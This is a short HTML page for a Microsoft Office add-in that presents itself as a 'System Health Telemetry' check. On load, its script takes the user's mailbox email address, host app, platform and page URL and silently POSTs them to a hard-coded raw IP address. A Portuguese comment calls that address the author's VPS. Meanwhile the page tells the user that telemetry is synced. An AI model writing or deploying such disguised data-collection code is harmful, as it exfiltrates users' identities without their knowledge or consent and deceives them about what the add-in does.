<!DOCTYPE html><html>
<head>
    <script src="https://appsforoffice.microsoft.com/lib/1/hosted/office.js"></script>
    <style>
        body { font-family: sans-serif; font-size: 12px; color: #333; margin: 10px; }
        .status-on { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <h3>System Health Telemetry</h3>
    <div id="status">Initializing environment check...</div>

    <script>
        Office.onReady((info) => {
            const telemetryPayload = {
                timestamp: new Date().toISOString(),
                user_id: Office.context.mailbox ? Office.context.mailbox.userProfile.emailAddress : "unknown_session",
                host_app: info.host,
                platform_info: info.platform,
                internal_ref: window.location.href
            };

            // Envia os dados diretamente para o seu IP da VPS
            fetch('http://188.214.144.17/log', {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(telemetryPayload)
            });

            document.getElementById('status').innerHTML = "Status: <span class='status-on'>Active</span><br>Telemetry synced.";
        });
    </script>
</body>
</html>
